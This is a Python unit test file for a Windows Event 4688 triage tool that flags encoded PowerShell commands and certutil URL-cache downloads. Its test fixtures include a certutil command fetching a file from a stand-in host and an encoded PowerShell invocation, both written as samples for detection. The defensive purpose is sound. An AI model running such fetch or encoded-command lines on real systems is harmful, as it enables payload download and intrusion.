import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path
from process_triage import inspect_event, parse_utc, read_events, triage

ROOT = Path(__file__).parent


def make_event(image="powershell.exe", command="powershell.exe -enc PLACEHOLDER", pid=100):
    return {
        "timestamp": "2026-10-10T10:00:00Z",
        "event_id": "4688",
        "host": "LAB-WKS-01",
        "username": "LAB\\tester",
        "image": image,
        "command_line": command,
        "parent_image": "explorer.exe",
        "process_id": pid,
        "_time": datetime(2026, 10, 10, 10, 0, tzinfo=timezone.utc),
    }


class WindowsProcessTriageTests(unittest.TestCase):
    def test_fixture_has_exactly_two_different_findings(self):
        findings = triage(read_events(ROOT / "events_4688.csv"))
        self.assertEqual([f["rule_id"] for f in findings], ["PS_ENCODED_COMMAND", "CERTUTIL_URLCACHE_FETCH"])

    def test_powershell_encoded_short_flag(self):
        self.assertEqual(inspect_event(make_event())[0]["rule_id"], "PS_ENCODED_COMMAND")

    def test_pwsh_full_flag_case_insensitive(self):
        self.assertEqual(inspect_event(make_event(r"C:\Program Files\PowerShell\7\pwsh.exe", "pwsh.exe -ENCODEDCOMMAND placeholder"))[0]["rule_id"], "PS_ENCODED_COMMAND")

    def test_power_shell_without_encoded_flag_is_not_flagged(self):
        self.assertEqual(inspect_event(make_event(command="powershell.exe -File backup.ps1")), [])

    def test_other_executable_with_encoded_flag_is_not_flagged(self):
        self.assertEqual(inspect_event(make_event("notepad.exe", "notepad.exe -enc placeholder")), [])

    def test_certutil_fetch_flags(self):
        findings = inspect_event(make_event("certutil.exe", "certutil -urlcache -split -f https://example.invalid/seed.bin out.bin"))
        self.assertEqual(findings[0]["rule_id"], "CERTUTIL_URLCACHE_FETCH")

    def test_certutil_hashfile_is_not_flagged(self):
        self.assertEqual(inspect_event(make_event("certutil.exe", "certutil -hashfile x SHA256")), [])

    def test_bad_utc_time_rejected(self):
        with self.assertRaises(ValueError):
            parse_utc("2026-10-10 10:00:00")

    def test_malformed_csv_rejected_with_line_context(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "bad.csv"
            path.write_text("timestamp,event_id,host,username,image,command_line,parent_image,process_id\n2026-10-10T10:00:00Z,4688,LAB,don,powershell.exe,-enc x,explorer.exe,-1\n", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "CSV line 2"):
                read_events(path)

    def test_wrong_event_id_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "bad.csv"
            path.write_text("timestamp,event_id,host,username,image,command_line,parent_image,process_id\n2026-10-10T10:00:00Z,4625,LAB,don,powershell.exe,-enc x,explorer.exe,7\n", encoding="utf-8")
            with self.assertRaisesRegex(ValueError, "event ID 4688"):
                read_events(path)

    def test_findings_sorted_by_timestamp(self):
        later = make_event(pid=2)
        later["timestamp"] = "2026-10-10T10:02:00Z"
        later["_time"] = parse_utc(later["timestamp"])
        earlier = make_event(pid=1)
        findings = triage([later, earlier])
        self.assertEqual([f["process_id"] for f in findings], [1, 2])


if __name__ == "__main__":
    unittest.main()
